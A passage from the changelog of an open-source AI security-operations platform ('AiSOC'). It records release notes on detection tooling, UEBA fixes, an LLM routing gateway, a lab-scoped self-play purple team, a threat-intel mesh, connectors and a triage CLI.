  from `app.clients.*`, which does not exist in `services/agents`, so every
  such step died with an unhandled `ModuleNotFoundError` — and the NL playbook
  drafter actively offers this step type.
- **A saved hunt's "run" button ran nothing.** It re-translated the question,
  stamped `last_run_at` and returned, so the console showed "last run just now"
  for a hunt that had queried nothing.
- **Generated content was presented as real findings.** A fabricated APT
  attribution in the alert detail view, synthetic hunt hits, and
  template-fallback copilot replies now declare their provenance.

### Changed

- **The v8.0 milestone is the close-the-loop release; package publishing moves
  to v8.1.** `@aisoc/mcp`, `@aisoc/sdk`, `aisoc-cli`, `aisoc-sdk`,
  `aisoc-plugin-sdk` and `aisoc-sandbox` remain unpublished and the README
  points at monorepo-local invocations. `publish-cli.yml` is OIDC-provenance
  ready and no-ops with a clear notice rather than faking a publish; it needs
  an `NPM_TOKEN` secret and a PyPI trusted publisher, which are account-level
  settings rather than code.
- **Nine new rows in the claim-to-gate matrix**, one per capability above, each
  naming the test that fails if the wiring regresses. 73 rows: 62 GATED, 11
  PARTIAL, 0 NO GATE.
- **New CI gate `check_mock_data_gated.py`** fails the build on a
  `fallbackData` receiving sample data un-wrapped, or sample data assigned to
  state with no demo-mode check.

### Fixed (carried from the unreleased section)

- **UEBA can no longer read an unscoreable baseline as normal behaviour.** A
  feature that had never been observed, had too few samples, or had zero
  variance produced a `0.0` z-score — the same value an observation sitting
  exactly on its own mean produces. Since the composite is a root-sum-of-
  squares, that zero contributed nothing and the entity read as all-clear;
  service accounts, batch jobs and automation users converge on a constant
  stream, so they could not raise an anomaly at all. `compute_z_score` now
  returns `None` for these cases and callers exclude it. Per-feature composites
  are unchanged (`0.0 ** 2` already contributed nothing), but a peer group
  whose features are all degenerate now yields no peer signal instead of a
  `0.0` that halved the caller's personal composite — a `critical` score was
  being reported as `medium`. Affected feature names are logged at `info`.
  A new `MIN_BASELINE_SAMPLES` setting (default 30) gates the sample count.

- **Agent investigations are now persisted to the ledger (issue #601).** The
  demo seed renames the canonical seed tenant's slug from `default` to `demo`,
  so the agents service's `tenant_ref="default"` fallback matched no tenant and
  every investigation was silently skipped (`ledger.skip_run
  reason=unknown_tenant` at `debug`) after already spending compute. Two fixes:
  the API now forwards the authenticated `tenant_id` to the agents service on
  `/cases/{id}/investigate` (the run is attributed to the real tenant), and the
  ledger resolver maps the `"default"` placeholder to the canonical seed tenant
  (stable UUID, regardless of its current slug) or the sole tenant in a
  single-tenant install. A genuinely unresolvable tenant now logs at `warning`
  with the run/case id, not `debug`.

## [7.7.0] — 2026-08-04

### Added

- **Self-service data lifecycle (Wave 5).** (1) **Configurable retention**
  (`/data-lifecycle/retention`): per-tenant windows (days) for `raw_events`
  (lake) / `alerts` / `audit`, clamped to `[1, 3650]`, with a bounded
  **tenant-scoped** ClickHouse purge and a parameterised Postgres purge (W5.1).
  (2) A **field-extraction / transform DSL** (`pipeline_transforms`): a safe,
  whitelisted, no-`eval` pipeline (`rename` / `copy` / `set` / `set_default` /
  `drop` / `lowercase` / `uppercase` / `coalesce` / grok-style `extract` with
  dotted paths + named captures) that reshapes events onto OCSF; the `extract`
  op compiles a `%{TOKEN:name}` template from `re.escape`d literals + a fixed
  linear-time token map, so it is ReDoS-proof by construction (no raw user
  regex); validation rejects unknown ops/tokens and oversized pipelines;
  runtime is fail-open per op and never mutates the input (W5.3). (3) **Runtime custom parsers**
  (`/data-lifecycle/parsers` + `/parsers/test`): a parser is a named,
  tenant-scoped, validated transform pipeline you can register and dry-run
  against a sample event (W5.2). Gated by `test_retention.py` +
  `test_pipeline_transforms.py`.
- **Customizable dashboard / report builder (Wave 7).** A declarative report is
  a list of widgets (whitelisted `type` × data `source`), validated for unknown
  types/sources, duplicate ids, and bounded size, then rendered by resolving
  each widget's data server-side — resilient to a failing/missing resolver (one
  bad widget renders an `error`, never breaks the report). `POST
  /report-builder/validate` + `/render` (the latter wires the real tenant-scoped
  `alerts_by_severity` resolver). The same definition can drive the live
  dashboard and an exported report. Gated by `test_report_builder.py` (8 cases).
- **Compliance mapping + agentless CSPM + destinations (Wave 6).** (1) An
  **agentless CSPM scan engine** (`cspm.scan_resources` + `POST /posture/scan`):
  evaluates a read-only cloud-resource snapshot against misconfiguration checks
  (public/unencrypted S3, world-open security groups on sensitive ports, IAM
  users without MFA / stale keys, public/unencrypted RDS, unencrypted EBS),
  emitting findings with severity + control refs (W6.2). (2) **Compliance
  control mapping with auto-evidence** (`compliance_mapping`): CSPM findings and
  fired detections (via MITRE) map to CIS / SOC 2 controls and mint dated
  evidence records automatically (W6.1). (3) **Notification/SOAR destinations**
  (`destinations` + `POST /posture/destinations/preview`): Opsgenie, email, and
  a generic `aisoc.handoff.v1` external-SOAR webhook, with an SSRF guard on
  outbound targets (W6.3). Gated by `test_compliance_cspm.py` (14 cases).
- **Invoking-identity scoping for response actions (Wave 4).** An
  `ActionPrincipal` (user id + tenant + roles + permissions) now rides on every
  `ActionRequest` (W4.1). The actions service enforces **least-privilege**: an
  action only runs if its principal holds the permission its blast radius
  demands (`actions:execute:{low,medium,high}`, higher tiers granting lower;
  `actions:*` granting all), with tenant binding (W4.2). The mutating action
  routes require a service bearer token and **fail closed** in production when
  unconfigured (W4.3). Approvals are **bound**: an approver must hold the
  action's permission and cannot approve their own request (separation of
  duties, W4.4). Gated by `test_authz.py` (10 cases).
- **Three detection-authoring modes (Wave 3).** (1) A **Python detection
  framework** (`packages/aisoc-detections`): write detections as
  `def rule(event) -> bool` + metadata + inline positive/negative `TESTS`,
  complementing the YAML/Sigma corpus; a fixture harness fails a blind rule
  (misses a positive) or a noisy one (fires on a negative), `evaluate()` is
  fail-closed, and a CI gate (`python-detections.yml`) runs it. Ships a CLI
  (`aisoc-detections`) + example detections. (2) An **AI Detection Builder**
  (`POST /nl-detection/propose`): a plain-English threat description becomes a
  Sigma rule with **auto-generated** positive/negative fixtures **derived from
  the rule's own selection** (not invented by the LLM), run through the
  non-circular eval-gate, and opened as a governed DRAFT proposal. (3) A
  **no-code / simple detection builder** (`SimpleRuleBuilder`): a form
  (field/operator/value rows) compiles to a valid Sigma rule dropped into the
  governed editor. Also fixes a real bug: `detection_loop` / the Wave-1 tuner +
  hunt bridge inserted into a non-existent `aisoc_detection_rule_proposals`
  table (the real table is `detection_rule_proposals`).
- **Detection backtesting over the event lake (Wave 2).** New
  `POST /api/v1/rules/{rule_id}/backtest` runs a candidate detection rule against
  REAL historical events in the tenant-scoped ClickHouse lake
  (`aisoc.raw_events`) over a bounded window and reports exactly how many events
  would have fired (`would_fire`), the `hit_rate`, and sample matches — so an
  engineer can see a rule's noise on real history before promoting it, instead of
  only testing against hand-crafted fixtures. The source filter is
  injection-sanitised and the SELECT is tenant-rewritten via
  `lake_sql.rewrite_for_tenant`. Read-only (`rules:read`). Gate: `test_backtest.py`.
  Also `POST /detection-proposals/{id}/backtest` attaches the result to the
  proposal's `eval_result["backtest"]` as a third promotion signal, with an
  opt-in `AISOC_BACKTEST_MAX_HIT_RATE` gate that blocks `/decide` approval for
  rules too noisy over history (W2.2, `test_backtest_gate.py`), and the rule
  editor gains a "Backtest over history" panel (W2.3).
- **Closed loop: outcomes compound, repeat alerts auto-suppress (Wave 1).** Every
  durable auto-triage outcome is now written back as a per-signature institutional
  prior (`services/agents/app/memory/outcomes.py`), and a later alert matching a
  trusted prior benign/false-positive disposition is auto-resolved WITHOUT
  re-triage — human priors are trusted immediately, AI priors require corroboration
  (repeat count + high confidence), and a prior true-positive never auto-closes a
  future alert. Suppressions are recorded to `aisoc_outcome_suppressions`
  (migration 048) and surfaced as a measured `repeat_alerts_suppressed` /
  `repeat_suppression_rate` on `GET /metrics/funnel`. Fusion now applies a bounded
  (±0.10), per-tenant institutional-memory nudge to fuse-time confidence
  (`MemoryPriorProvider` distils disposition history; refreshed on a cadence),
  scheduled hunt findings open governed DRAFT `DetectionRuleProposal`s
  (`hunt-finding` source), and the previously-orphaned disposition-history tuner is
  wired via `POST /detection/tuning/auto-suggest`. Gates: `test_outcome_memory.py`,
  `test_memory_nudge.py`, `test_wave1_loop_edges.py`; claim-to-gate matrix +4.
- **LLM gateway (LiteLLM) — task-based model routing + observability
  ([#478](https://github.com/beenuar/AiSOC/issues/478), PR1).** New `litellm`
  service in `docker-compose.yml` as the single entry point for live LLM calls.
  AiSOC requests a **logical task alias** (`aisoc-triage`, `aisoc-recon`,
  `aisoc-investigation`, `aisoc-copilot`, `aisoc-summary`, `aisoc-report`,
  `aisoc-nl`); the alias → real-model mapping lives entirely in
  `infra/litellm/config.yaml`, so operators assign different local or hosted
  models per task — and swap them — without any AiSOC code change (commented
  Ollama/vLLM/Anthropic examples ship in the config). Per-task latency, tokens,
  cost, errors, retries, and fallbacks are exported on `/metrics` and scraped by
  the bundled Prometheus (new `aisoc-litellm` job; the third-party image is
  allowlisted in `scripts/audit_prometheus_targets.py`). Opt-in and
  non-breaking: unset `OPENAI_BASE_URL` keeps calls going direct to the provider,
  and the deterministic offline path is unaffected. Docs:
  `apps/docs/docs/operations/llm-gateway.md`; config test
  `services/agents/tests/test_litellm_config.py`. (A follow-up PR wires the ~10
  in-code callsites to request these aliases via `model_pins` and removes the
  hardcoded `gpt-4o-mini` default, closing #478.)
- **LLM task-alias routing — no more shipped default model
  ([#478](https://github.com/beenuar/AiSOC/issues/478), PR2).** Every live LLM
  call now asks for a **logical task alias** instead of a hardcoded model. New
  `services/agents/app/llm/factory.py` (`make_chat_model` / `resolve_model_alias`)
  resolves a task role to its `aisoc-<role>` alias + the gateway base URL;
  `model_pins.py` now pins all seven roles (triage, recon, investigation, copilot,
  summary, report, nl) to aliases with a `deterministic` floor. The ~10 scattered
  `os.getenv("AISOC_LLM_MODEL"/"OPENAI_MODEL","gpt-4o-mini")` + `ChatOpenAI(...)` /
  raw-HTTP callsites across the agents (auto-triage, cloud/identity/insider/
  phishing, recon/forensic/responder/report-writer, copilot, contextual, NL
  translator) and the API endpoints (translation, hunts, knowledge base, phishing;
  via new `services/api/app/services/model_aliases.py`) now request aliases; the
  hardcoded `gpt-4o-mini` default is gone. **Behaviour change:** live LLM now runs
  through the gateway (`OPENAI_BASE_URL`), or pin a concrete model per role via
  `AISOC_MODEL_PIN_<ROLE>` (escape hatch; the slim demo does this so keyed demos
  keep working); with neither, the deterministic offline path is used. Tests:
  `services/agents/tests/test_llm_factory.py` + tightened `test_litellm_config.py`.
  Closes #478.
- **v8 P4 — Compounding Memory (verdicts that measurably improve).** New
  `services/fusion/app/memory/`: a nightly-distillable institutional memory that
  makes verdicts more accurate the longer an instance runs. **Distillation**
  (`distill.py`) compresses analyst overrides + verdict history into two
  versioned (content-hashed), ledger-referenceable outputs — per-signature
  priors (FP rate + prior) and a top-N few-shot exemplar bank per category.
  **Memory verdict stage** (`stage.py`) turns a signature's prior into a
  **bounded** verdict delta capped at ±0.10 (nudge, never dominate; cap +
  direction unit-tested). **Improvement telemetry** (`improvement.py`) computes
  verdict precision over time + the lift from install to latest ("N% more
  accurate than at install") — measured 0.60→0.90 on a simulated (clearly
  labelled synthetic) 90-day override history. **Portable signed memory packs**
  (`pack.py`) — `aisoc memory export` (`pnpm aisoc:memory:export -- --demo`)
  distills + **Ed25519-signs** a pack so an MSSP can bootstrap a child tenant
  from a curated baseline; import verifies the signature and rejects a tampered
  pack + can pin the publisher key (round-trip + tamper-rejection tests). The
  `aisoc-memory-pack` format is the marketplace memory-pack artifact type. 9
  tests (auto-run in the fusion CI job); docs
  `apps/docs/docs/concepts/compounding-memory.md`. (Nightly distill scheduling,
  the dashboard improvement chart, and live-path consumption of the memory stage
  are the documented remaining integration steps.)
- **v8 P3 — Investigation Swarm (parallel hypothesis agents).** New
  `services/agents/app/swarm/`: for hard cases, fan out 3–5 competing hypothesis
  agents in parallel, then run a structured debate node that ranks them.
  **Complexity gate** (`complexity.py`) fires the swarm only above an
  entity/technique-spread threshold (defaults ≥3/≥3); simple alerts stay on the
  cheaper single-agent path. **Hypotheses** (`hypotheses.py`) — ransomware
  staging, insider exfil, lateral movement, C2 beacon, and a benign
  backup/maintenance FP — each with supporting/contradicting signal +
  corroborating techniques. **Swarm** (`swarm.py`) runs the agents concurrently
  (`asyncio.gather`) each under a per-agent token budget, so total spend is
  bounded. **Debate** (`debate.py`) scores hypotheses on explicit criteria
  (evidence coverage, contradiction count, institutional-memory prior) and emits
  a ranked list with margin-based confidence, recorded as a first-class new
  `debate` ledger step type (the public replay UI colors + renders it). **Eval
  gate** `tests/test_swarm_vs_single.py` publishes both numbers and asserts the
  swarm beats single-agent on the investigation-completeness macro by ≥10% under
  a cost ceiling (measured lift +0.556 on the synthetic set) — added to the
  agents CI job. Completeness is a **substrate self-consistency** macro (breadth
  of hypotheses considered), explicitly not a live-LLM accuracy claim; the
  incident set is labelled synthetic. Docs:
  `apps/docs/docs/concepts/investigation-swarm.md`. 9 tests.
- **v8 P2 — Self-Play Purple Team (the SOC that attacks itself).** New
  `services/purple-team/app/adversary/`: turns the purple-team service from a
  test runner into a continuous adversary. **Hard scope guard**
  (`scope_guard.py`) — a SOC that attacks itself must never touch production, so
  this is enforced in **code** (raises `ScopeViolation` before any step) not as
  a prompt: every target must carry an allowlisted lab tag AND no forbidden
  production tag; no force flag. Adversarial tests cover production assets,
  untagged assets, empty target sets, and a `lab`+`crown-jewel` laundering
  attempt (all hard-fail). **Planner** (`planner.py`) composes an ordered
  kill-chain (initial-access → execution → persistence → privesc → exfil),
  selecting only techniques whose platform exists among the lab targets ("attack
  what exists"). **Closed loop** (`campaign.py`) emits telemetry per step
  (pluggable: in-memory for tests/canned, Kafka on the live path), a detection
  oracle scores detected/missed, and computes detection rate + mean-time-to-
  verdict. **DAC auto-file** (`dac.py`) files one eval-gated Sigma-scaffold
  proposal per miss (status `proposed`, low confidence — self-play can only
  propose, never silently merge). **Scoreboard** (`scoreboard.py` +
  `apps/docs/static/data/selfplay-scoreboard.json`) with a per-row `synthetic`
  flag so a canned campaign is never mistaken for a measured live run. Canned
  5-stage campaign via `pnpm aisoc:selfplay` (offline, deterministic, ~seconds)
  runs in CI through `test_canned_campaign_runs_end_to_end`. 14 tests total; docs
  at `apps/docs/docs/concepts/self-play.md`. (Nightly live wiring — Kafka emitter
  + alert-store oracle + HTTP DAC filer into the scheduler — is the documented
  remaining integration step.)
- **v8 P1 — Federated Threat Intel Mesh (the network effect).** New
  `services/mesh/` (Python/FastAPI, port 8010): opt-in gossip of two
  privacy-preserving artifact types between self-hosted instances via a
  lightweight, open-source hub. (1) **IOC sightings** — `SHA-256` of the
  normalized indicator (never the raw value) + coarse type + severity +
  first/last-seen; private-set-intersection style, so a peer learns a value only
  if it already has it. (2) **Verdict signatures** — the institutional-memory
  signature key (category + connector + technique) + verdict distribution + mean
  confidence; no entities, tenant data, or free text. **Privacy gates:**
  k-anonymity (consensus revealed only at `>= k` distinct instances, default 5,
  `AISOC_MESH_K`), per-instance **Ed25519** signing (verified hub-side, so one
  actor can't inflate consensus with sock-puppets — tested), tenant/rule-level
  opt-out, a per-instance outbound-audit receipts log, and a `mesh_preview` that
  shows the exact outbound payload before sharing is enabled. **Consumption:** a
  deterministic `consensus.py:mesh_contribution` verdict stage bounded to
  **±0.10** (the mesh nudges, never dominates; cap unit-tested). Public network
  stats page at `/mesh` (fetches the hub's `/v1/stats`, graceful when the hub is
  offline). 11 tests cover the full privacy contract (k-anonymity threshold,
  sock-puppet resistance, Ed25519 verify, PSI hashing, opt-out, bounded
  contribution, preview redaction, two-instance exchange, per-instance audit);
  added to the wave-2 service CI matrix. Threat model:
  `docs/architecture/mesh.md`; `SECURITY.md` gains a mesh disclosure policy. The
  measured FP-suppression lift (mesh on vs. off) is explicitly deferred and
  labelled **simulated-until-measured** on the benchmark/`/mesh` pages — never
  presented as measured production performance.
- **v8 G1 — launch kit (ships in-repo with the code).** New `marketing/launch/`:
  a Show HN draft centered on `npx aisoc triage --demo`, a 90-second demo-video
  shot list (CLI wow → replay permalink → self-play → mesh stats), Product Hunt
  assets, six technical blog outlines (one per phase, each ending in a
  reproducible command), and a **category-level** comparison dossier vs.
  closed-source AI SOC products — deliberately **without naming any competitor**
  (per project policy), with every AiSOC-side claim linked to code or a CI gate.
  Plus a `docs/press/` kit (boilerplate, fast facts, logo kit, naming). All
  materials are written to two rules — no superlatives, and synthetic-vs-measured
  always labelled — and are linked from `CONTRIBUTING.md` for community
  amplification. The launch-kit README points every claim back to the benchmark
  page + claim-to-gate matrix so nothing ungated gets published.
- **v8 W4 — GitHub-native distribution (`aisoc-action`).** New
  `packages/aisoc-action/` (Node20 JS action, **dependency-free** — a
  hand-rolled Actions runtime + a `fetch`-based GitHub REST client, deliberately
  no `@actions/*`/octokit so the shipped bundle carries no vulnerable `undici`;
  the committed bundle is 18 KB): triages the repo's **own**
  security signals — Dependabot alerts, CodeQL/code-scanning findings, and
  secret-scanning alerts — with the deterministic AiSOC verdict engine (no LLM,
  nothing leaves the runner) and posts verdicts + suppression rationale +
  prioritization as a PR comment (idempotent update-in-place), a job summary, or
  a weekly `aisoc-digest` posture issue with an A–F grade and week-over-week
  delta. Runtime-scope Dependabot vulns are prioritized as
  exploitable-in-your-dependency-graph ("3 of 41 findings are act-now"); sources
  the token can't read degrade gracefully. Inputs: `mode`, `min-severity`,
  `fail-on` (gate mode), `sources`. The verdict engine is a byte-for-byte
  vendored copy of `packages/aisoc-lite/src/verdict/` kept in sync by
  `scripts/sync_vendored_verdict.py` (CI `--check` gate), bundled into a
  committed `dist/index.js`. Dogfooded on this repo via
  `.github/workflows/aisoc-selfscan.yml`. CI (`aisoc-action.yml`): sync-check +
  typecheck + 6 fixture tests + a dist-freshness gate (committed bundle must
  match a fresh build). Docs: `apps/docs/docs/integrations/github-action.md`
  with copy-paste PR + digest workflows. **Fixes a latent workspace defect:** the
  monorepo root package was also named `aisoc` (colliding with the CLI package),
  so it was renamed to `aisoc-monorepo` (installer repo-detection sentinels now
  prefix-match, staying compatible with existing clones).
- **v8 W2 — standalone free web tools (search-indexed acquisition).** Four
  login-free, open-source tools under `apps/web/src/app/(tools)/tools/`, each
  with its own landing page, JSON-LD, OG metadata, and an "open source, part of
  AiSOC" backlink; **everything runs in the browser — user rules never touch the
  server** (the deterministic path is pure client-side). (1) **Detection
  Translator** (`/tools/translate`): paste any rule, get Sigma / SPL / KQL /
  ES\|QL / YARA-L2 / UDM at once, with per-dialect copy buttons and a stable
  `?s=` permalink. (2) **NL → Detection** (`/tools/nl2sigma`): plain English →
  a Sigma scaffold plus the three SIEM dialects, via a deterministic
  artifact-extraction generator (honest about being a starting point). (3)
  **ATT&CK Coverage Grader** (`/tools/coverage`): paste Sigma rules / technique
  IDs → an A–F grade, a per-tactic heatmap, the top-10 highest-prevalence
  uncovered techniques, and a downloadable shareable grade card (via
  `@aisoc/report-card`). (4) **Alert Noise Calculator** (`/tools/noise`):
  project FP suppression + analyst hours/cost saved from the published
  deterministic-tier suppression rate (methodology linked; labelled as a
  substrate figure, not a live-LLM claim). SEO plumbing: 30 programmatic
  format-pair landing pages (`/tools/translate/spl-to-kql`, …) generated from a
  matrix via `generateStaticParams`, plus sitemap entries for all tool routes.
  Logic (`apps/web/src/lib/tools/`) is pure and unit-tested (13 tests: translate
  field-map + permalink round-trip, coverage extraction/grading/top-uncovered,
  noise projection/clamping, NL→Sigma scaffolding). Production build verified
  (tools static, pair pages SSG'd).
- **v8 W3 — shareable investigation artifacts (the screenshot loop).** Public,
  immutable, redacted investigation-replay permalinks. New
  `services/api/app/api/v1/endpoints/replay.py`: `POST /ledger/{run_id}/publish/preview`
  builds a redacted snapshot **and returns the alias map** so the publisher
  reviews exactly what will be hidden (the pre-publish diff) before confirming;
  `POST /ledger/{run_id}/publish` (needs `confirm=true`) re-builds server-side
  and stores an immutable `published_replays` row (migration `045`, with an
  UPDATE-blocking trigger that only allows the view counter to change); public
  `GET /r/{slug}` serves the snapshot without auth from a non-RLS session
  (the data is post-redaction and non-identifying by design). Redaction reuses
  the reversible `Pseudonymizer` (vendored into the API via
  `scripts/sync_vendored_redactor.py`): internal IPs / emails / paths / secrets
  / internal hostnames / usernames become aliases, while public IOCs + ATT&CK
  techniques are preserved as the shareable value; only the redacted snapshot is
  persisted, never the alias map (`services/api/app/services/replay_redaction.py`).
  Web: a public `/r/[slug]` page renders an animated playback (timeline scrubber,
  evidence cards, growing attack graph, verdict stamp with elapsed time) with a
  dynamic `next/og` Open Graph image for X/LinkedIn/Slack unfurls;
  shields.io-compatible badge endpoints at `/api/badge/<kind>`. New shared
  `packages/@aisoc/report-card` renders triage / coverage-grade / replay share
  cards (SVG + Markdown) and is now the canonical renderer behind the CLI
  `--share` flag (bundled into `aisoc` at build time). The seeded LockBit case
  `INC-RT-001` is published as the canonical demo replay at `/r/demo-lockbit`.
  Tests: redaction (no raw PII survives, public IOCs preserved), report-card
  renderers, badge endpoint, and the replay fetch client. `docs/openapi.yaml`
  regenerated (+284 lines, additions only).
- **v8 W1 — `npx aisoc` wedge CLI (the 60-second wow).** New `packages/aisoc-lite/` (TypeScript, published to npm as `aisoc`, one runtime dependency): a zero-install front door that triages a batch of alerts to verdicts in under a minute with **no credentials and no LLM key**. `npx aisoc triage --demo` runs a bundled, fully-deterministic 200-alert fixture in ~50 ms and prints a terminal verdict table plus the copy-pasteable headline "AiSOC triaged 200 alerts: 12 TP, 171 FP suppressed (85.5% noise), 17 need review". The verdict engine (`src/verdict/stages.ts`) is a faithful port of the production triage scorer `services/agents/app/confidence/scoring.py` — the weight stack and band thresholds (≥.80 TP, ≥.60 likely-TP, ≥.40 review, else benign; clamp [0.05, 0.95]) are pinned by a parity test so a CLI verdict lands where the full stack would. `--file alerts.jsonl` triages a local export (Splunk / Sentinel / Elastic ECS / CrowdStrike field spellings auto-detected); `--llm` refines only the ambiguous `needs_review` middle using the user's **own** `ANTHROPIC_API_KEY`/`OPENAI_API_KEY` called directly (never proxied); `--share` writes a redacted, aggregate-only report card (Markdown + 1200×630 SVG, no alert content); `translate` is a CLI front for the deterministic detection-rule field-map translator (Sigma/SPL/KQL/ES\|QL/YARA-L2/UDM); `up` boots the full demo stack from a pinned Compose bundle. Telemetry is strictly opt-in (`--telemetry` / `AISOC_TELEMETRY=1`, default off), aggregate counts only, documented in `packages/aisoc-lite/TELEMETRY.md` and asserted content-free by a unit test. 22 vitest tests. New CI: `aisoc-cli.yml` (build + typecheck + tests + a cross-platform cold `triage --demo` e2e asserting the headline and a <60 s bound + a fixture-staleness diff gate) and `publish-cli.yml` (npm publish with build provenance on a `cli-v*` tag; no-ops safely until `NPM_TOKEN` is configured — we never fake a publish). README top fold rewritten around the one-liner (guarded "lands on npm with the v8.0 launch; today it builds from `packages/aisoc-lite/`").

## [7.6.0] — 2026-07-13

**Fully-Operational AI-SOC release.** Completes the A1–E1 roadmap that wired the three end-to-end paths the reality audit found unwired — the event lake is now populated, the executable detection corpus fires on the live stream, every fused alert is auto-triaged (copilot default), and approved SOAR actions execute against real connector credentials under an autonomy policy — and adds the competitive-parity differentiators (unified Data Explorer, live effective-permissions, fuse-time attack chains, autopilot/copilot scorecard) plus nine new connectors and AI/LLM-usage governance. The claim-to-gate matrix reaches **33 GATED / 7 PARTIAL / 0 NO GATE**: every product claim is backed by a failing test, and the ratchet (`MAX_NO_GATE=0`) forbids regression.

### Added

- **Phase E1 — the last `NO GATE` is closed: every product claim is now backed by a failing test.** The public benchmark scoreboard was hand-maintained and the only automation (`wet-eval.yml`) no-ops without a funded LLM key, so nothing in per-PR CI proved the published headline number matched what the agent actually scores. New `scripts/check_scoreboard.py` makes the scoreboard **backed by a failing test**: on every PR (agents CI job) it runs the deterministic live-agent MITRE-accuracy eval over the 200-incident corpus and fails if the newest `substrate` row in `apps/docs/static/data/scoreboard.json` drifts more than 0.02 from the fresh run, the JSON breaks its schema, or a substrate row is mislabelled (honesty invariant: a deterministic number can never be quoted as live-LLM). The funded weekly `wet-eval.yml` still appends the LLM-tier (`substrate:false`) rows. A fresh `v7.5.0` substrate row (0.97 MITRE accuracy, tokens/USD = 0) is published. Claim-to-gate matrix: the last NO GATE → GATED **and** `MAX_NO_GATE` ratcheted 1 → 0 (the `security.yml` gate now fails if *any* NO GATE ever reappears); the L0–L4 row also moved PARTIAL → GATED (Phase B2 `decide()`-in-dispatch). **Matrix is now 33 GATED / 7 PARTIAL / 0 NO GATE** — the Fully-Operational roadmap (Phases A1–E1) is complete.
- **Phase D3 — live-vendor connector smoke (mock-server conformance).** The contract test proved each connector *declares* the async runtime methods; this goes further. New `services/connectors/tests/connectors/test_live_vendor_smoke.py` stands up a mock HTTP server (respx) returning realistic vendor payloads and drives each connector's **real** `test_connection()` + paginated `fetch_alerts()` HTTP path end-to-end, asserting a successful probe and that pulled events normalize to a valid five-tier severity — catching the wrong-endpoint-path / normalize-KeyErrors-on-real-shape failures a bare contract test misses. Covers the Phase D1/D2 connectors (QRadar, Exabeam, Securonix, Devo, Netskope, Windows/Sysmon, Zeek/Suricata, syslog/CEF, LLM-usage). Moves two claim-to-gate rows PARTIAL → GATED ("Connectors: schema-driven config + vault-encrypted secrets" and "Connectors: live Test connection"), retiring the Phase 10b deferral (31 GATED / 8 PARTIAL / 1 NO GATE).
- **Phase D2 — AI/LLM-usage governance + tiered lake storage.** Three pieces. (1) **AI/LLM-usage audit connector** (`services/connectors/app/connectors/llm_usage.py`) pulls OpenAI + Anthropic organization audit logs — API key creation, role grants, logging/MFA changes, project deletes — and emits the dotted `event_type` (`openai.api_key.created`, `anthropic.member.added`) that the detections match. (2) **Eight native `llm-*` detection rules** (`scripts/detection_specs_part3_application.py`): LLM API/admin-key created, owner granted, audit logging disabled (critical), MFA disabled, service-account created, project archived — regenerated into the corpus (825 executable rules) and re-exported to the fusion live-detection ruleset; verified firing end-to-end. (3) **Hot/warm/cold lake tiering** (`services/api/clickhouse/tiering/`): an opt-in ClickHouse storage policy + `002_tiering.sql` that rebinds `aisoc.raw_events` to a `tiered` policy and moves data to a cold (object/NAS) volume at 30 days, deleting at 90 — the Phase 6 tiering wired now that the lake is populated. Verified end-to-end on ClickHouse 23.8 (policy loads, table rebinds, TTL applied); a static config gate (`test_storage_tiering.py`) catches drift. Registry 77→78; connector-count + conformance-matrix + marketplace regenerated. Claim-to-gate matrix +1 GATED (29 GATED / 10 PARTIAL / 1 NO GATE).
- **Phase D1 — eight new connectors close the biggest coverage gaps (SIEM / NDR / edge / endpoint).** Following the connector convention (schema + registry + `plugins/<id>/plugin.yaml` + docs + `marketplace:sync`), adds: **IBM QRadar** (offenses; magnitude→severity), **Exabeam** (notable risk-scored sessions), **Securonix** (incidents; priority→severity), **Devo** (triggered alerts) — the four SIEMs the reality audit flagged as missing; **Netskope** (SASE/SWG DLP/malware/anomaly alerts, malware/DLP floored at `high`); **Windows Event / Sysmon** (WEF collector spool; severity from channel + Event ID — log clears, service installs, process-injection surfaces floored); **Zeek / Suricata NDR** (Suricata `eve.json` priority + Zeek `notice` types); and a first-class **generic syslog / CEF listener** (parses the ArcSight CEF header + extension, CEF severity 0–10 → five-tier, non-CEF lines ingested at `info`). Every connector maps onto the exact five-tier ladder and passes the schema + runtime conformance gates. Registry now 69→77 connectors; connector-count + conformance-matrix + marketplace index regenerated. 40 new unit tests (severity mapping across the ladder, CEF parser, mocked pulls); full connectors suite 791 passed at 67.37% coverage. Claim-to-gate matrix +1 GATED (28 GATED / 10 PARTIAL / 1 NO GATE).
- **Phase C3 — autopilot/copilot posture with a visible autonomy scorecard (defaults to copilot).** The per-action guardrail editor already let operators scope autonomy by action; C3 adds the whole-SOC posture view a CISO asks for. New `apps/web/src/components/settings/AutonomyScorecard.tsx` computes an honest posture from the *configured* policy (not fabricated runtime stats): **Copilot** (the safe default — high/critical-blast actions always require a human) vs **Autopilot** (flips only when a high/critical-blast action is configured to auto-execute), plus the distribution of actions by blast radius and auto-exec/override counts. Rendered atop the existing `AutonomyPolicyPanel`. The compute is a pure, unit-tested function; 6 vitest tests (`AutonomyScorecard.test.tsx`). Combined with the Phase B2 `AISOC_MATURITY_TIER` gate (which enforces copilot at the dispatch layer), the platform is copilot-by-default end-to-end. Claim-to-gate matrix +1 GATED (27 GATED / 10 PARTIAL / 1 NO GATE).
- **Phase C1 — Advanced Data Explorer: one investigation surface, no SIEM context-switch.** New `/explore` (`apps/web/src/components/explore/ExploreView.tsx`) unifies the surfaces shipped earlier in the roadmap into a single workbench: ask a question in plain English → it translates to SQL via `/api/v1/nl-query/translate` → runs against the now-populated ClickHouse event lake (`/api/v1/lake/sql`, Phase A1) → renders a BI-like table (row count, latency, referenced tables), with a raw-SQL escape hatch always available. Source tabs pivot to identity (effective permissions), config/graph, and threat intel so the analyst answers "who touched this, with what access, and is the IP known-bad?" without leaving the page. Adds a typed `lakeApi` client, sidebar + command-palette + sitemap entries. 5 vitest smoke tests (`ExploreView.test.tsx`); web type-check + full coverage gate green (395 tests). Claim-to-gate matrix +1 GATED (26 GATED / 10 PARTIAL / 1 NO GATE).
